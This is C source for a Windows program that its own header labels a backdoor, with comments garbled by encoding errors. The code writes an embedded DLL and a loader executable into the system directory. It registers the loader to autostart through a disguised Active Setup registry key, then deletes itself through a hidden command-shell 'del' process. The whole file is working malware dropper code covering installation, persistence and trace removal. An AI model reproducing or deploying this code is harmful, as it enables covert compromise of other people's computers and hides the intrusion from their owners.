//////////////////////////////////////////////////////////////////////////
//FileName:	Server	
//Data:		2009-04-07
//REM:		BackDoor�����
//////////////////////////////////////////////////////////////////////////
#pragma once
#pragma comment(linker, "/subsystem:windows /entry:main")
#include "resource.h"
#include <Windows.h>


//////////////////////////////////////////////////////////////////////////
//�궨�岿��
//////////////////////////////////////////////////////////////////////////
#define DLLNAME	"\\Dll.dll"
#define LOADER	"\\Loader.exe"

//////////////////////////////////////////////////////////////////////////
//������������
//////////////////////////////////////////////////////////////////////////
//�ͷ�DLL��Loader
BOOL Release2File(const char* fname,HRSRC hRsrc);
//дע���ʵ��������
BOOL Write2Register(const char* fname);
//��ɾ��
BOOL SelfDelete();

int main(void)
{
	char fname[MAX_PATH] = {0};

	char path[MAX_PATH] = {0};
	GetSystemDirectory(path,MAX_PATH);
	//GetCurrentDirectory(MAX_PATH,path);

	//�ͷ�DLL��Loader
	memset(fname,0,sizeof(fname));
	memcpy(fname,path,strlen(path));
	strcat(fname,DLLNAME);
	HRSRC hRsrc = FindResource(NULL,MAKEINTRESOURCE(IDR_DLL1),TEXT("DLL"));
	Release2File(fname,hRsrc);

	memset(fname,0,sizeof(fname));
	memcpy(fname,path,strlen(path));
	strcat(fname,LOADER);
	hRsrc = FindResource(NULL,MAKEINTRESOURCE(IDR_EXE1),TEXT("EXE"));
	Release2File(fname,hRsrc);

	//дע���ʵ��������(Loader��
	Write2Register(fname);

	//��ɾ��
	SelfDelete();
}

//////////////////////////////////////////////////////////////////////////
//�ͷ�DLL��Loader
//REM:	��һ��˼·�����ͷ�ǰ�����ֽڣ�Ȼ���Լ����ȥMZͷ������������
//////////////////////////////////////////////////////////////////////////
BOOL Release2File(const char* fname,HRSRC hRsrc)
{
	if (hRsrc==NULL)
	{
		return FALSE;
	}

	//��ȡ��Դ��С
	DWORD dwSize = SizeofResource(NULL,hRsrc);
	if (dwSize==0)
	{
		return FALSE;
	}

	//������Դ
	HGLOBAL	gl = LoadResource(NULL,hRsrc);
	if (gl==NULL)
	{
		return FALSE;
	}

	//������Դ
	LPVOID lp = LockResource(gl);
	if (lp==NULL)
	{
		return FALSE;
	}

	//Ϊ���ݷ���ռ�
	LPBYTE p = (LPBYTE)GlobalAlloc(GPTR,dwSize);

	//������Դ����
	CopyMemory((LPVOID)p,lp,dwSize);

	HANDLE	fp = CreateFile(fname,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);

	DWORD dwWritten;
	if (!WriteFile(fp,(LPVOID)p,dwSize,&dwWritten,NULL))
	{
		return FALSE;
	}

	//�رվ��
	CloseHandle(fp);
	//�ͷ��ڴ�
	FreeResource(gl);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//дע���ʵ��������
//////////////////////////////////////////////////////////////////////////
BOOL Write2Register(const char* fname)
{

	HKEY hKey;

	RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{NS517-0XQO-SKETCHER-19901117-GMAILCOM}",&hKey);
	RegSetValue(hKey,NULL,REG_SZ,"ϵͳ����",strlen("ϵͳ����"));

	RegSetValueEx(hKey,"stubpath",0,REG_EXPAND_SZ,(BYTE*)fname,lstrlen(fname));
	RegCloseKey(hKey);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//��ɾ��
//////////////////////////////////////////////////////////////////////////
BOOL SelfDelete()
{
	char	szModule[MAX_PATH];
	char	szComspec[MAX_PATH];
	char	szParams[MAX_PATH];

	//��ô��ļ���
	if ( GetModuleFileName(0,szModule,MAX_PATH)!=0 && GetShortPathName(szModule,szModule,MAX_PATH)!=0 && GetEnvironmentVariable(TEXT("COMSPEC"),szComspec,MAX_PATH)!=0 )
	{
		//�����������
		lstrcpy(szParams,TEXT(" /c del "));
		lstrcat(szParams,szModule);
		lstrcat(szParams,TEXT(" > nul"));
		lstrcat(szComspec,szParams);

		//���ṹ��
		STARTUPINFO	si = {0};
		PROCESS_INFORMATION	pi = {0};
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		//Ϊ����������Դ����
		SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentProcess(),THREAD_PRIORITY_TIME_CRITICAL);

		//��������
		if (CreateProcess(0,szComspec,0,0,0,CREATE_SUSPENDED | DETACHED_PROCESS,0,0,&si,&pi))
		{
			//��ͣһֱ���ó����˳���ִ��
			SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
			SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE);

			//�Եͼ���ָ���������
			ResumeThread(pi.hThread);

			return TRUE;
		}
		else
		{
			SetPriorityClass(GetCurrentProcess(),NORMAL_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentProcess(),THREAD_PRIORITY_NORMAL);
		}
	}

	return FALSE;
}